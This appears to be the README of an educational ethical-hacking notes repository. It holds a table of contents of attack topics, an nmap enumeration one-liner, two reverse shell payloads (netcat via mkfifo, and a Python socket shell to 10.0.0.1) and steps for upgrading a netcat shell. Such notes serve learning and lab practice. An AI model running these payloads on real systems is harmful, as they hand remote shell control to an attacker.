# ScriptKiddie

This repo contains some concepts and code snippets related to Ethical hacking. The Contents are given in alphabetical order.

***Disclaimer: This is for educational purpose and not to gain unauthorized access. Using your hacking skills on machines withuot permissions is illegal, so use it with responsibility***
## Contents
- [Burp & OWASP ZAP](./concepts/16.md)
- [chisel](./concepts/9.md)
- [Cross-site request forgery (CSRF)](./concepts/20.md)
- [CVE](./concepts/13.md)
- [Directory traversal](./concepts/23.md)
- [Django](./concepts/15.md)
- [enum4linux]
- [Gobuster](./concepts/12.md)
- [Linux PrivEsc, LinPEAS & LinEnum](./concepts/17.md)
- [Networking tools](./concepts/2.md)
- [Nikto](./concepts/11.md)
- [nmap](./concepts/2a.md)
- [OSI & TCP/IP Model](./concepts/1.md)
- [OWASP Top 10](./concepts/14.md)
- [Pivoting](./concepts/4.md)
- [proxychain](./concepts/6.md)
- [Server-side request forgery (SSRF)](./concepts/19.md)
- [Server Side Template Injection with Jinja/Flask](./concepts/25.md)
- [shell](./concepts/5.md)
- [socat](./concepts/7.md)
- [ssh](./concepts/27.md)
- [sshuttle](./concepts/8.md)
- [SQLi](./concepts/24.md)
- [Static binaries](./concepts/10.md)
- [Websites basics](./concepts/3.md)
- [Web Requests using Python, Regex, HTML parser](./concepts/26.md)
- [XSS](./concepts/28.md)
- [XXE](./concepts/22.md)


## Enumeration

```
ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports $ip
```

## Common Shell Payloads
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
[Github Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Stabilize nc shell

After getting a reverse shell by listening on any port using `nc -lvnp <port>` We can get upgrade the shell by performing the following
1. Run `python -c 'import pty;pty.spawn("/bin/bash")'`. If this gives error like "python dont exist" use python2 or python3 instead.

Just by using this we will get a comparatively better shell. But we can't use autocomplete and arrow keys. For more stable shell

2. Run `export TERM=xterm` in reverse shell and background the process with Ctrl + Z.
3. Run `stty raw -echo; fg` in your own terminal. This will give the stable shell.
